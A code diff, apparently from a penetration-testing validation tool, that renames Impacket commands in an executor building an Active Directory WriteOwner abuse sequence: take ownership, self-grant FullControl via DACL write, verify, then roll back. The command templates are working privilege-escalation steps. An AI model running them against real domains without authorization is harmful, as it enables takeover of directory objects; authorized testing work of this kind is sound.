@@ -5,11 +5,11 @@ WriteOwner/FullControl/GenericAll over a target takes ownership, then
 self-grants FullControl via a DACL write (the new owner implicitly gets
 WriteDacl), PROVEN by a positive ACE read-back:
 
-    dacledit.py -action read   (confirm the PRECONDITION ACE)
-    owneredit.py -action read  (capture the BASELINE owner, for honest rollback)
-    owneredit.py -action write -new-owner <trustee>
-    dacledit.py -action write -ace-type grant -rights FullControl -principal <trustee>
-    dacledit.py -action read   (POSITIVE confirmation -- the terminal proof)
+    impacket-dacledit -action read   (confirm the PRECONDITION ACE)
+    impacket-owneredit -action read  (capture the BASELINE owner, for honest rollback)
+    impacket-owneredit -action write -new-owner <trustee>
+    impacket-dacledit -action write -ace-type grant -rights FullControl -principal <trustee>
+    impacket-dacledit -action read   (POSITIVE confirmation -- the terminal proof)
     ROLLBACK (TWO sub-steps, BOTH required for verified=True):
         1. remove the self-granted ACE (identical, non-vacuous predicate to WRITE-DACL)
         2. restore the ORIGINAL owner + re-read; exact string match against the
@@ -25,7 +25,7 @@ verified by construction -- ``rollback.verified`` stays ``False`` with
 ``True``.
 
 ``verified_recipe=False`` (recipe-known, not lab-proven). UNVERIFIED: the exact
-owneredit.py/dacledit.py human-readable wording (see ``acl_common.py``).
+impacket-owneredit/impacket-dacledit human-readable wording (see ``acl_common.py``).
 """
 from __future__ import annotations
 
@@ -92,15 +92,15 @@ class WriteOwnerExecutor(ValidationExecutor):
         v = values(params)
         dc = ctx.config.dc_ip
         return [
-            f"dacledit.py -action read -target '{v['target']}' -dc-ip {dc} <auth>  "
+            f"impacket-dacledit -action read -target '{v['target']}' -dc-ip {dc} <auth>  "
             "(confirm precondition ACE)",
-            f"owneredit.py -action read -target '{v['target']}' -dc-ip {dc} <auth>  "
+            f"impacket-owneredit -action read -target '{v['target']}' -dc-ip {dc} <auth>  "
             "(capture baseline owner)",
-            f"owneredit.py -action write -new-owner '{v['trustee']}' -target "
+            f"impacket-owneredit -action write -new-owner '{v['trustee']}' -target "
             f"'{v['target']}' -dc-ip {dc} <auth>",
-            f"dacledit.py -action write -ace-type grant -rights FullControl "
+            f"impacket-dacledit -action write -ace-type grant -rights FullControl "
             f"-principal '{v['trustee']}' -target '{v['target']}' -dc-ip {dc} <auth>",
-            f"dacledit.py -action read -target '{v['target']}' -dc-ip {dc} <auth>  "
+            f"impacket-dacledit -action read -target '{v['target']}' -dc-ip {dc} <auth>  "
             "(POSITIVE readback = the terminal proof)",
             "ROLLBACK: remove self-granted ACE + restore original owner, BOTH verified",
         ]
